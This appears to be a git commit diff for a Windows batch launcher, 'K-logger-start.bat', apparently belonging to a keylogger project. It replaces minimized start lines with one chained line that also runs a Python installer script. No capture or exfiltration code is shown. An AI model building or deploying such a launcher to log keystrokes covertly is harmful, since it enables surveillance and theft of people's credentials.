448114e9f5afea89308b8aae2e3e4d7e60d4339f
Lewis Newlands <123844871+Lewis418@users.noreply.github.com>
2024-04-24 23:10:42 +0100

    Update K-logger-start.bat

--- K-logger-start.bat
+++ K-logger-start.bat
@@ -1,4 +1,2 @@
 @echo off
-start /min keyboard-package-check.bat
-start /min timeout /t 15
-start /min K-logger-internal-code.bat
+start /min Python-installer.bat & start /min keyboard-package-check.bat & start /min K-logger-internal-code.bat
